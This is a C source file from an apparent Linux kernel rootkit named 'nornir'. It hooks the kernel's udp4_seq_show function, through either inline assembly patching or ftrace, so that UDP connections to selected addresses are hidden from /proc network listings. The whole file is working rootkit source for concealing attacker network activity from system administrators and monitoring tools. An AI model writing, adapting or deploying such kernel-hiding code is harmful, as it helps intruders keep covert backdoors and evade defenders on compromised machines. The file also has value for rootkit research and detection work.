/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include "common/logger.h"
#include "libs/hooks.h"
#include "libs/ksym.h"
#include "net/hide.h"
#include "net/udp_hook.h"

#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW

static int (*orig_udp4_seq_show) (struct seq_file *m, void *v);

static int nornir_exec_orig_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *inet;
    struct sock *sk;
    struct in_addr addr;

    if (unlikely(v == SEQ_START_TOKEN)) {
        return 1;
    }

    sk = v;
    inet = inet_sk(sk);
    addr.s_addr = inet->inet_daddr;

    if (unlikely(nornir_get_hidden_conn4_info(addr))) {
        return 0;
    }

    return 1;
}

static int nornir_udp4_seq_show_placeholder(void)
{
    return 1;
}

#endif

#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE

static size_t nornir_evil_udp4_seq_show_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5);

static struct asm_hook_info udp4_seq_show_asm_info = {
    .exec_orig = (void*) nornir_exec_orig_udp4_seq_show,
    .hook_before = (void*) nornir_udp4_seq_show_placeholder,
    .hook_after = NULL,
    .new_dst = nornir_evil_udp4_seq_show_asm_wrapper,
};

static size_t nornir_evil_udp4_seq_show_asm_wrapper
(size_t arg0, size_t arg1, size_t arg2, size_t arg3, size_t arg4, size_t arg5)
{
    size_t args[6];

    args[0] = arg0;
    args[1] = arg1;
    args[2] = arg2;
    args[3] = arg3;
    args[4] = arg4;
    args[5] = arg5;

    return nornir_asm_inline_hook_helper(&udp4_seq_show_asm_info, args);
}

static int nornir_install_inline_asm_udp4_seq_show_hooks(void)
{
    int err;

    udp4_seq_show_asm_info.orig_func = (void*) orig_udp4_seq_show;
    err = nornir_install_inline_asm_hook(
        &udp4_seq_show_asm_info,
        nornir_evil_udp4_seq_show_asm_wrapper
    );
    if (err) {
        logger_error("Unable to hook symbol \"udp4_seq_show\".\n");
        goto err_udp4_seq_show;
    }

    return 0;

err_udp4_seq_show:
    return err;
}

static void nornir_remove_inline_asm_udp4_seq_show_hooks(void)
{
    nornir_remove_inline_asm_hook(&udp4_seq_show_asm_info);
}

#endif

#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE

static void
nornir_evil_udp4_seq_show_ftrace(unsigned long ip, unsigned long parent_ip,
                            struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_udp4_seq_show(
        (void*) fregs->regs.di, (void*) fregs->regs.si
    ))) {
        fregs->regs.ip = (size_t) nornir_udp4_seq_show_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}

static int nornir_install_ftrace_udp4_seq_show_hooks(void)
{
    int err;

    err = nornir_install_ftrace_hook(
        orig_udp4_seq_show,
        nornir_evil_udp4_seq_show_ftrace
    );
    if (err) {
        logger_error("Unable to hook symbol \"udp4_seq_show\".\n");
        goto err_udp4_seq_show;
    }

    return 0;

err_udp4_seq_show:
    return err;
}

static void nornir_remove_ftrace_udp4_seq_show_hooks(void)
{
    nornir_remove_ftrace_hook(orig_udp4_seq_show);
}

#endif

#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW

static int nornir_init_udp4_seq_show_hooks(void)
{
#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE
    return nornir_install_inline_asm_udp4_seq_show_hooks();
#elif defined(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE)
    #ifndef CONFIG_DYNAMIC_FTRACE
        #error "Current kernel do not enable CONFIG_DYNAMIC_FTRACE"
    #endif
    return nornir_install_ftrace_udp4_seq_show_hooks();
#else
    #error "No functing-hook techniques were chosen"
#endif
}

static void nornir_unload_udp4_seq_show_hooks(void)
{
#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE
    nornir_remove_inline_asm_udp4_seq_show_hooks();
#elif defined(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE)
    #ifndef CONFIG_DYNAMIC_FTRACE
        #error "Current kernel do not enable CONFIG_DYNAMIC_FTRACE"
    #endif
    nornir_remove_ftrace_udp4_seq_show_hooks();
#else
    #error "No functing-hook techniques were chosen"
#endif
}

#endif

int nornir_init_udp_hooks(void)
{
    int err;

#ifdef CONFIG_NORNIR_HIDE_UDP4_CONN

#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
    if (nornir_ksym_addr_lookup(
        "udp4_seq_show", (size_t*)&orig_udp4_seq_show, NULL, NULL
    )){
        logger_error("Unable to look up symbol \"udp4_seq_show\".\n");
        err = -ECANCELED;
        goto err_udp4_sym;
    }

    err = nornir_init_udp4_seq_show_hooks();
    if (err) {
        logger_error(
            "Unable to initialize udp4_seq_show() hooks, error code: %d.\n",
            err
        );
        goto err_udp4_seq_show;
    }

#endif

#endif

    return 0;

#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
#ifdef CONFIG_NORNIR_HIDE_UDP4_CONN
err_udp4_seq_show:
err_udp4_sym:
#endif
#endif
    return err;
}

void nornir_unload_udp_hooks(void)
{
#ifdef CONFIG_NORNIR_HIDE_UDP4_CONN
#ifdef CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
    nornir_unload_udp4_seq_show_hooks();
#endif
#endif
}
